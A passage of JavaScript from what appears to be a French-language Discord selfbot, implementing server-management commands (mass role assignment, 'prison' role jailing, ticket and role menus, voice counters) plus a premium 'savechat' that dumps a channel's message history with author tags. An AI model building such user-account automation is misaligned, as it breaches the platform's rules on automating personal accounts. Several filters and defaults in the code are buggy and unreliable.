            else if (!args[0]){
                message.edit(`ガ __**${name} - Auto Role**__ ガ\n${gestion[message.guildId].autorole.length === 0 ? "Aucun Rôle" : gestion[message.guildId].autorole.filter(async r => message.guild.roles.cache.get(r)).map(roleId => `> <@&${roleId}>`).join('\n')}`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "piconly")){
            if (!message.guild) return message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1]) return message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *Veuillez mentionner un salon*`)

                if (gestion[message.guildId].piconly.includes(channel?.id)) return message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *${channel.name} est déjà un salon piconly*`)
                gestion[message.guildId].piconly.push(channel?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *${channel.name} est maintenant dans un salon piconly*`)
            }
            else if (args[0] === "remove"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1]) return message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *Veuillez mentionner un salon*`)

                if (!gestion[message.guildId].piconly.includes(channel?.id)) return message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *${channel.name} n'est pas un salon piconly*`)
                gestion[message.guildId].piconly = gestion[message.guildId].piconly.filter(id => id !== channel?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Pic Only**__ ガ\n> *${channel.name} n'est plus un salon piconly*`)
            }
            else if (!args[0]){
                message.edit(`ガ __**${name} - Pic Only**__ ガ\n${gestion[message.guildId].piconly.length === 0 ? "Aucun salon" : gestion[message.guildId].piconly.filter(async c => await message.guild.channels.cache.get(c)).map(channelID => `> <#${channelID}>`).join('\n')}`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "massrole")){
            if (!message.guild) return message.edit(`ガ __**${name} - Mass Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            const add = ["add", "remove"]
            const type = ["humains", "bots", "all"]

            if (!add.includes(args[0])) return message.edit(`ガ __**${name} - Mass Role**__ ガ\n> *Veuillez choisir l'un de ses choix: ${add.map(e => `\`${e}\``).join(', ')}*`)
            if (!type.includes(args[1])) return message.edit(`ガ __**${name} - Mass Role**__ ガ\n> *Veuillez choisir l'un de ses choix: ${type.map(e => `\`${e}\``).join(', ')}*`)
        
            const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[2]) || await client.roles.fetch(args[2]).catch(() => false)
            if (!role || !args[2]) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Veuillez mentionner un rôle*`)
            if (!role.editable) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Vous ne pouvez pas donner ce rôle*`)

            await message.guild.members.fetch()
            const members = message.guild.members.cache.filter(m => args[0] === "add" ? !m.roles.cache.has(role?.id) : m.roles.cache.has(role?.id))
            const types = members.filter(m => args[1] === "humains" ? !m.user?.bot : args[1] === "bots" ? m.user?.bot : "")
        
            if (args[0] === "add"){
                message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Je vais donner le rôle ${role} à ${types.size} membres*`)
                types.forEach(m => m.roles.add(role).catch(() => false))
            }
            else if (args[0] === "remove"){
                message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Je vais retirer le rôle ${role} à ${types.size} membres*`)
                types.forEach(m => m.roles.remove(role).catch(() => false))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "savechat")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel
            if (!channel) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez mentionner un salon*`)
            let number = parseInt(args[0] || args[1]) || 9n

            async function fetchAll(){
                let messages = [];
                let lastID;
                while (true) { 
                    const fetchedMessages = await message.channel.messages.fetch({
                        limit: 100,
                        ...(lastID && { before: lastID }),
                    });
                    if (fetchedMessages.size === 0) {
                        messages = messages.filter(msg => !msg.author?.bot)
                        return messages;
                    }
                    messages = messages.concat(Array.from(fetchedMessages.values()));
                    lastID = fetchedMessages.lastKey();
                }
            }

            let allMessages = await fetchAll();
            allMessages = allMessages.reverse();
            let results = allMessages.slice(allMessages.length - number, allMessages.length).map(msg => `Content: ${msg.content} Author: ${msg.author.tag} Date: [${formatDateWithTime(msg.createdTimestamp)}] Attachments: ${msg.attachments.size > 0 ? msg.attachments.first().url : "None"}`).join('\n');
            fs.writeFile(`./${message.channel?.id}_${message.author?.id}`, results, async () => {
                await message.edit({ content: null, files: [{ attachment: `./${channel?.id}_${message.author?.id}`, name: `${channel?.id}.txt`}]});
                fs.unlink(`./${channel?.id}_${message.author?.id}`, (err) => err => false);
            })
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "soutiens")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Mass Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "role"){
                if (args[1] === "off"){
                    gestion[message.guildId].soutiens.role = null
                    client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                    message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *Le rôle du soutiens a été supprimé*`)
                }
                else {
                    const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[2]) || await client.roles.fetch(args[2]).catch(() => false)
                    if (!role || !args[1]) return message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *Veuillez mentionner un rôle*`)
        
                    gestion[message.guildId].soutiens.role = role?.id
                    client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                    message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *${role} sera le rôle donné lors du soutiens*`)
                }
            }
            else if (args[0] === "status"){
                if (args[1] === "off"){
                    gestion[message.guildId].soutiens.status = null
                    client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                    message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *Le status du soutiens a été supprimé*`)
                }
                else {
                    if (!args[1]) return message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *Veuillez inclure un status*`)
        
                    gestion[message.guildId].soutiens.status = args.slice(1).join(' ')
                    client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                    message.edit(`ガ __**${name} - Soutiens**__ ガ\n> *${args.slice(1).join(' ')} sera le rôle donné lors du soutiens*`)
                }
            }
            else {
                message.edit(`ガ __**${name} - Soutiens**__ ガ\n>>> *Rôle* ${client.separator} ${message.guild.roles.cache.get(gestion[message.guildId].soutiens.role) || "`Aucun`"}\n*Status* ${client.separator} \`${gestion[message.guildId].soutiens.status || "Aucun"}\``)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ticket")){
            if (!message.guild) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const m = await message.channel.messages.fetch(args[1])
                if (!m || !args[1]) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Veuillez entrer un ID de message valide*`)

                if (gestion[message.guildId]?.tickets[m?.id]) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *L'ID du message existe déjà*`)

                tmessages.push(m?.id)
                setTimeout(() => tmessages = tmessages.filter(id => id !== m?.id), 1000)

                const r = await m.react(args[2]).catch(() => false)
                if (!r || !args[2]) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Veuillez entrer une réaction valide*`)

                let category = message.mentions.channels.first() || message.guild.channels.cache.get(args[3]) || null
                if (category && category.type !== "GUILD_CATEGORY") category = null

                gestion[message.guildId].tickets[m.id] = ({ reaction: args[2], categoryId: category })
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Le panel de ticket a été crée*`)
            }
            else if (args[0] === "remove"){
                if (!args[1]) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Veuillez entrer un ID de message valide*`)
                if (!gestion[message.guildId]?.tickets[args[1]]) return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Le ticket avec cet ID n'existe pas*`)
                delete gestion[message.guildId]?.tickets[args[1]]
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                return message.edit(`ガ __**${name} - Ticket**__ ガ\n> *Le ticket a été supprimé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "autoreact")){
            if (!message.guild) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1]) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez mentionner un salon*`)
                if (!args[2])return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez inclure une réaction*`)

                const r = await message.react(args[2]).catch(() => false)
                if (!r) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez me donner une réaction valide*`)

                message.reactions.removeAll()
                if (!gestion[message.guildId].autoreact[channel?.id]) gestion[message.guildId].autoreact[channel?.id] = ({ reactions: [] })

                gestion[message.guildId].autoreact[channel?.id].reactions.push(r._emoji.name)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto React**__ ガ\n> *${channel} (${r._emoji.name}) a été ajouté à l'autoreact*`)
            }
            else if (args[0] === "remove"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1]) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *Veuillez mentionner un salon*`)

                if (!gestion[message.guildId].autoreact[channel?.id].reactions.includes(args[2])) return message.edit(`ガ __**${name} - Auto React**__ ガ\n> *${channel} n'a pas d'auto react*`)
                gestion[message.guildId].autoreact[channel?.id].reactions = gestion[message.guildId].autoreact[channel?.id].reactions.filter(id => id !== args[2])
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto React**__ ガ\n> *L'emoji a été supprimé de l'auto react*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tempvoc")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                const category = message.guild.channels.cache.get(args[2]) || await message.guild.channels.fetch(args[2]).catch(() => false)
                if (!channel || !args[1] || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *Veuillez mentionner un salon vocale*`)
                if (!category || !args[2] || category.type !== "GUILD_CATEGORY") return message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *Veuillez inclure une ID de catégorie*`)

                if (!gestion[message.guildId].tempvoc[channel?.id]) gestion[message.guildId].tempvoc[channel?.id] = ({ categoryId: null, name: null })

                gestion[message.guildId].tempvoc[channel?.id].categoryId = category?.id
                gestion[message.guildId].tempvoc[channel?.id].name = args.slice(3).join(' ') || "・"
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *${channel} est maintenant un salon Join to Create*`)
            }
            else if (args[0] === "remove"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1]) return message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *Veuillez mentionner un salon*`)

                if (!gestion[message.guildId].tempvoc[channel?.id]) return message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *${channel} n'est pas un salon Join to Create*`)
                delete gestion[message.guildId].tempvoc[channel?.id]
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Temp Voc**__ ガ\n> *${channel} n'est plus un salon Join to Create*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rolemenu")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const m = await message.channel.messages.fetch(args[1])
                if (!m || !args[1]) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez inclure un ID de message*`)

                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[2]) || await message.guild.roles.fetch(args[2]).catch(() => false)
                if (!role || !args[2]) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez mentionner un rôle*`)

                const r = await m.react(args[3]).catch(() => false)
                if (!r) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez me donner une réaction valide*`)

                if (!gestion[message.guildId]?.rolemenu[m?.id]) gestion[message.guildId].rolemenu[m?.id] = []

                gestion[message.guildId]?.rolemenu[m?.id].push({reaction: r._emoji.name, roleId: role?.id})
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Le rolemenu a été ajouté*`)
            }
            else if (args[0] === "remove"){
                const m = await message.channel.messages.fetch(args[1])
                if (!m || !args[1]) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez inclure un ID de message*`)

                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[2]) || await message.guild.roles.fetch(args[2]).catch(() => false)
                if (!role || !args[2]) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Veuillez mentionner un rôle*`)

                if (!gestion[message.guildId]?.rolemenu[m?.id]) return message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Cet ID n'est pas un role menu*`)
                gestion[message.guildId].rolemenu[m?.id] = gestion[message.guildId]?.rolemenu[m?.id].filter(id => id.roleId !== role?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Role Menu**__ ガ\n> *Le rolemenu a été supprimé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rolelimit")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
                if (!role || !args[1]) return message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Veuillez mentionner un rôle*`)
                
                let number = parseInt(args[2]) || 10

                if (!gestion[message.guildId]?.rolelimit[role?.id]) gestion[message.guildId].rolelimit[role.id] = { limit: null, name: null }

                gestion[message.guildId].rolelimit[role.id].limit = number
                gestion[message.guildId].rolelimit[role.id].name = role.name

                const memberCount = message.guild.members.cache.filter(member => member.roles.cache.has(role?.id)).size;
                if (memberCount > number) return message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *${memberCount}/${number} membres ont le rôle ${role}. La limit est supperieur. *`)
                role.edit({ name: `${role.name} [${memberCount}/${number}]` });

                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Le rôle ${role} a été limité à ${number} membres*`)
            }
            else if (args[0] === "remove"){
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
                if (!role || !args[1]) return message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Veuillez mentionner un rôle*`)


                if (!gestion[message.guildId]?.rolelimit[role?.id]) return message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Aucun rôle limite d'existant pour le rôle ${role}*`)
                role.setName(gestion[message.guildId]?.rolelimit[role?.id].name).catch(() => false)
                
                delete gestion[message.guildId]?.rolelimit[role?.id]
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Role Limit**__ ガ\n> *Le role limit a été supprimé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "counter")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Counter**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1] || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Counter**__ ガ\n> *Veuillez mentionner un salon vocale*`)
                if (gestion[message.guildId].counter.some(o => o.channelId === channel?.id)) return message.edit(`ガ __**${name} - Counter**__ ガ\n> *${channel} est déjà un salon counter*`)
                
                const vari = await message.edit(`
                > \`[member.role-roleId]\` = Le nombre de membres ayant un rôle
                > \`[server.roles]\` = Le nombre de rôles du serveur
                > \`[server.channels]\` = Le nombre de salons du serveur
                > \`[server.text]\` = Le nombre de salons textuel du serveur
                > \`[server.voice]\` = Le nombre de salons vocal du serveur
                > \`[server.cam]\` = Le nombre de membres en caméra activé
                > \`[server.ecran]\` = Le nombre de membres en partage d'écran
                > \`[server.boosts]\` = Le nombre de boosts du serveur
                > \`[server.tier]\` = Le niveau du serveur
                > \`[server.onlines]\` = Le nombre de membres pas hors ligne
                > \`[server?.idle]\` = Le nombre de membres inactif
                > \`[server.dnd]\` = Le nombre de membres en ne pas déranger
                > \`[server.stream]\` = Le nombre de membres en streaming
                > \`[server?.botCount]\` Le nombre de bots du serveur
                > \`[server.humainCount]\` Le nombre de membres humains du serveur
                > \`[server.memberCount]\` Le nombre de membres du serveur`.replaceAll('                ', ""))

                const question = await message.channel.send(`ガ __**${name} - Counter**__ ガ\n> *Quel est le nom du counter ?\n> **Veuillez répondre: <t:${Math.round((Date.now() + 1000 * 60 * 5) / 1000)}:R>***`)

                let text = await message.channel.awaitMessages({ filter: m => m.author?.id === message.author?.id, max: 1, time: 1000 * 60 * 5})
                question.delete().catch(() => false)

                if (!text || text.size === 0) return vari.delete().catch(() => false)
                text.first().delete().catch(() => false)

                let role = message.guild.roles.cache.get(text.first().content.split("[member.role-")[1]?.replace("]", "")) ?? null

                channel.setName(text.first().content
                    .replace(`[member.role-${role?.id}]`, message.guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                    .replace("[server.roles]", message.guild.roles.cache.size)
                    .replace('[server.channels]', message.guild.channels.cache.size)
                    .replace("[server.text]", message.guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                    .replace("[server.voice]", message.guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                    .replace('[server.cam]', message.guild.members.cache.filter(m => m.voice.selfVideo).size)
                    .replace('[server.ecrean]', message.guild.members.cache.filter(m => m.voice.streaming).size)
                    .replace('[server.boosts]', message.guild.premiumSubscriptionCount)
                    .replace('[server.tier]', message.guild.premiumTier)
                    .replace('[server.onlines]', message.guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                    .replace('[server?.idle]', message.guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                    .replace('[server.dnd]', message.guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                    .replace('[server.stream]', message.guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                    .replace('[server?.botCount]', message.guild.members.cache.filter(m => m.user?.bot).size)
                    .replace('[server.humainCount]', message.guild.members.cache.filter(m => !m.user?.bot).size)
                    .replace('[server.memberCount]', message.guild.memberCount)
                ).catch(() => false)

                gestion[message.guildId].counter.push({channelId: channel?.id, channelName: text.first().content })
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                vari.edit(`ガ __**${name} - Counter**__ ガ\n> *Le salon ${channel} est maintenant un counter*`)
            }
            else if (args[0] === "remove"){
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || await message.guild.channels.fetch(args[1]).catch(() => false)
                if (!channel || !args[1] || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Counter**__ ガ\n> *Veuillez mentionner un salon vocale*`)

                if (!gestion[message.guildId].counter.some(o => o.channelId === channel?.id)) return message.edit(`ガ __**${name} - Counter**__ ガ\n> *${channel} n'est pas un salon counter*`)
                
                gestion[message.guildId].counter = gestion[message.guildId].counter.filter(o => o.channelId !== channel?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Counter**__ ガ\n> *${channel} n'est plus un counter*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "prison")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "role"){
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
                if (!role || !args[1]) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Veuillez mentionner un rôle*`)

                gestion[message.guildId].prison.roleId = role?.id
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)

                message.edit(`ガ __**${name} - Prison**__ ガ\n> *${role} est le nouveau rôle prison*`)
            }
            else if (args[0] === "setup"){
                const role = message.guild.roles.cache.get(gestion[message.guildId].prison.roleId)
                if (!role) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Aucun rôle prison n'est configurer. Faites \`${prefix}presion role <@role>\`*`)

                const category = await message.guild.channels.create(`${message.guild.name}・PRISON`, {
                    type: "GUILD_CATEGORY",
                    permissionOverwrites: [{
                        id: message.guild.roles.everyone?.id,
                        deny: ["VIEW_CHANNEL"],
                    }, 
                    {
                        id: role?.id,
                        allow: ["SEND_MESSAGES", "READ_MESSAGE_HISTORY", "VIEW_CHANNEL"],
                    }]
                })

                const channel = await message.guild.channels.create('🛡️・chat-prison', { parent: category?.id })

                gestion[message.guildId].prison.categoryId = category?.id
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Prison**__ ガ\n> *La prison a été crée avec succès*`)
            }
            else if (args[0] === "sync"){
                const role = message.guild.roles.cache.get(gestion[message.guildId].prison.roleId)
                if (!role) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Aucun rôle prison n'est configurer. Faites \`${prefix}presion role <@role>\`*`)

                message.edit(`ガ __**${name} - Prison**__ ガ\n> *Synchronisation des permissions en cours...*`)

                message.guild.channels.cache.forEach(async (channel) => {
                    let category = message.guild.channels.cache.find((c) => c?.id === gestion[message.guildId].prison.categoryId);
                    if (channel.parentId !== category?.id){
                        channel.permissionOverwrites.create(role, {
                            SEND_MESSAGES: false,
                            ADD_REACTIONS: false,
                            VIEW_CHANNEL: false,
                            READ_MESSAGE_HISTORY: false,
                            CONNECT: false,
                            SPEAK: false
                        })
                    }
                             
                    else if (channel.parentId === category?.id) {
    
                        channel.permissionOverwrites.create(role, {
                            SEND_MESSAGES: true,
                            ADD_REACTIONS: true,
                            VIEW_CHANNEL: true,
                            READ_MESSAGE_HISTORY: true,
                            CONNECT: true,
                            SPEAK: true
                        })
                    }
                })

                message.edit(`ガ __**${name} - Prison**__ ガ\n> *Les permissions des salons ont été mis à jour*`)
            }
            else if (args[0]){
                const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
                const role = message.guild.roles.cache.get(gestion[message.guildId].prison.roleId)
                if (member && !role) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Aucun rôle prison n'est configurer. Faites \`${prefix}presion role <@role>\`*`)
                if (!member) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Veuillez mentionner un membre*`);

                if (member.roles.cache.has(role?.id)) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *${member} est déjà en prison*`);
                if (!gestion[message.guildId].prison.members[member?.id]) gestion[message.guildId].prison.members[member?.id] = { roles: [] }
                gestion[message.guildId].prison.members[member?.id].roles = member.roles.cache.filter(r => r?.id !== message.guild.roles.everyone?.id).map(r => r?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                member.roles.set([role])
                message.edit(`ガ __**${name} - Prison**__ ガ\n> *${member} a été ajouté à la prison*`)
            }
            else {
                const role = message.guild.roles.cache.get(gestion[message.guildId].prison.roleId)
                if (role) message.edit(`ガ __**${name} - Prison**__ ガ${message.guild.members.cache.filter(m => m.roles.cache.has(role?.id)).map(m => `> ${m}`).join('\n')}`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unprison")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member ||!args[0]) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Veuillez mentionner un membre*`);

            const role = message.guild.roles.cache.get(gestion[message.guildId].prison.roleId)
            if (!role) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *Aucun rôle prison n'est configurer. Faites \`${prefix}presion role <@role>\`*`)

            if (!member.roles.cache.has(role?.id)) return message.edit(`ガ __**${name} - Prison**__ ガ\n> *${member} n"est pas en prison*`);
            
            await member.roles.set([])
            gestion[message.guildId].prison.members[member?.id]?.roles?.forEach(roleId => {
                const role = message.guild.roles.cache.get(roleId)
                if (role) member.roles.add(role)
            })
            
            delete gestion[message.guildId].prison.members[member?.id]
            client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
            message.edit(`ガ __**${name} - Prison**__ ガ\n> *${member} a été retiré de la prison*`)
        }










































































        else if (cmd.slice(0, 1).join(' ') === (prefix + "barre")){
            if (!args[0]) return message.edit(`ガ __**${name} - Barre**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`~~${args.join(' ')}~~`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gras")){
            if (!args[0]) return message.edit(`ガ __**${name} - Gras**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`**${args.join(' ')}**`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "italique")){
            if (!args[0]) return message.edit(`ガ __**${name} - Italique**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`*${args.join(' ')}*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "retourne")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            const mapping = '¡"#$%⅋,)(*+\'-˙/0ƖᄅƐㄣϛ9ㄥ86:;<=>?@∀qƆpƎℲפHIſʞ˥WNOԀQɹS┴∩ΛMX⅄Z[/]^_`ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz{|}~'
            const OFFSET = '!'.charCodeAt(0);
        
            if (!args[0]) return message.edit(`ガ __**${name} - Retourne**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(args.join(' ').split('').map(c => c.charCodeAt(0) - OFFSET).map(c => mapping[c] || ' ').reverse().join(''))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "empty")){
            message.edit(`_ _`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unflip")){
            message.edit(`┬─┬ ノ( ゜-゜ノ)`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tableflip")){
            message.edit(`(╯°□°）╯︵ ┻━┻`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "lenny")){
            message.edit(`( ͡° ͜ʖ ͡°)`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "shrug")){
            message.edit(`¯\_(ツ)_/¯`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "clap")){
            if (!args[0]) return message.edit(`ガ __**${name} - Clap**__ ガ\n> *Veuillez entrer un texte valide*`)
            message.edit(args.join('👏'))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "reverse")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Reverse**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(args.join(' ').split('').reverse().join(''))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "morse")){
